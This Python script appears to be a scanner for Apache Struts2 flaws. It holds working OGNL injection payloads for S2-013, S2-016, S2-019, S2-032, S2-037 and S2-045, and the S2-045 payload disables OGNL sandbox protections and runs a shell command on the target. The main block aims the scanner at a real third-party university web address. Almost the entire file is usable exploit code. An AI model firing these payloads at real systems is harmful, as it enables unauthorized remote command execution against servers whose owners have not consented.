#!/usr/bin/python
# __author__ = 'jasonsheh'
# -*- coding:utf-8 -*-

import re
import requests
from urllib.parse import urlparse


class Struts2:
    def __init__(self, urls):
        self.urls = urls
        self.url = ''

    def struts2_013(self):
        exp = '''?a=${(%23_memberAccess["allowStaticMethodAccess"]=true,%23req=@org.apache.struts2.ServletActionContext
        @getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println('webpath
        %3a'%2b%23req.getRealPath("/")),%23out.close())}'''

        try:
            resp = requests.get(self.url+exp)
            if "webpath:" in resp.text:
                return "s2-013"
        except:
            return None
        return None

    def struts2_016(self):
        exp = "?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest" \
              "%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealP" \
              "ath%28%22%2f%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRes" \
              "ponse%27%29%2C%23matt.getWriter%28%29.println%28%27webpath%3A%27%2b%23c%29%2C%23matt.getWriter%28%29" \
              ".flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D"

        try:
            resp = requests.get(self.url+exp)
            if "webpath:" in resp.text:
                return "s2-016"
        except:
            return None
        return None

    def struts2_019(self):
        exp = "?debug=command&expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServle" \
              "tRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRespons" \
              "e%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpa" \
              "th%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.g" \
              "etWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29"

        try:
            resp = requests.get(self.url + exp)
            if "webpath" in resp.text:
                return "s2-019"
        except:
            return None
        return None

    def struts2_032(self):
        exp = "?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#" \
              "resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter" \
              " (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0]))," \
              "#ot.flush(),#ot.close&a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&b=com.opensymphony.xwo" \
              "rk2.dispatcher.HttpServletResponse&c=UTF-8&d=/&e=webpath:"

        try:
            resp = requests.get(self.url+exp)
            if "webpath:" in resp.text:
                return "s2-032"
        except:
            return None
        return None

    def struts2_037(self):
        exp = "/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp" \
              "=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter ()," \
              "#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot." \
              "flush(),#ot.close):xx.toString.json?&a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&b=com.o" \
              "pensymphony.xwork2.dispatcher.HttpServletResponse&c=UTF-8&d=/&e=webpath:"
        try:
            resp = requests.get(self.url+exp)
            if "webpath:" in resp.text:
                return "s2-037"
        except:
            return None
        return None

    def struts2_045(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko)"
                          " Chrome/56.0.2924.87 Safari/537.36",
            "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_mem"
                            "berAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.Action"
                            "Context.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl"
                            ".OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExclud"
                            "edClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo webpath:').(#iswi"
                            "n=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=("
                            "#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuil"
                            "der(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache."
                            "struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons."
                            "io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"}
        try:
            resp = requests.get(self.url, headers=headers)
            if "webpath:" in resp.text:
                return "s2-045"
        except:
            return None
        return None

    def struts2(self):
        r = self.struts2_013() or self.struts2_016() or self.struts2_019() or self.struts2_032() or self.struts2_037()\
            or self.struts2_045()
        if r:
            print('存在漏洞: %s : %s' % (r, self.url))

    def run(self):
        if self.urls:
            for url in self.urls:
                self.url = url
                self.struts2()


if __name__ == '__main__':
    Struts2(['http://e.njutcm.edu.cn/thesis/index.do']).run()

